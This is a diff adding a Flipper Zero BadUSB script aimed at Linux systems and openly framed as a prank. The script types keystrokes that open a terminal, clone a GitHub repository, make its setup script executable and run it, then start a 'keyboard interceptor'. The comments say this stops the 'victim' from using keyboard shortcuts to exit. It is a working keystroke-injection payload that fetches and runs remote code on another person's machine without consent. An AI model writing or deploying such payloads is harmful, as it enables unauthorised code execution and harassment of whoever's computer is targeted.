@@ -1,0 +1,38 @@
+REM Hacker Terminal with Keyboard Interceptor - Flipper Zero BadUSB script
+REM This script installs and runs the hacker terminal with keyboard interceptor
+REM For maximum pranking effect - blocks keyboard shortcuts from working
+REM Target: Linux/Ubuntu systems
+
+REM Open terminal
+ALT F2
+DELAY 300
+STRING gnome-terminal
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Clone the repository
+STRING git clone https://github.com/Gr3y-foX/linux_hacker_theme_video.git /tmp/hacker_terminal
+DELAY 500
+ENTER
+DELAY 3000
+
+REM Navigate to the directory
+STRING cd /tmp/hacker_terminal
+DELAY 300
+ENTER
+DELAY 500
+
+REM Run keyboard interceptor setup
+STRING chmod +x setup_keyboard_interceptor.sh && ./setup_keyboard_interceptor.sh
+DELAY 300
+ENTER
+DELAY 5000
+
+REM Run with keyboard interception
+STRING ./run_with_intercept.sh
+DELAY 300
+ENTER
+
+REM Done! The victim won't be able to use keyboard shortcuts to exit
+REM They will need to know the special Ctrl+Shift+X sequence to exit
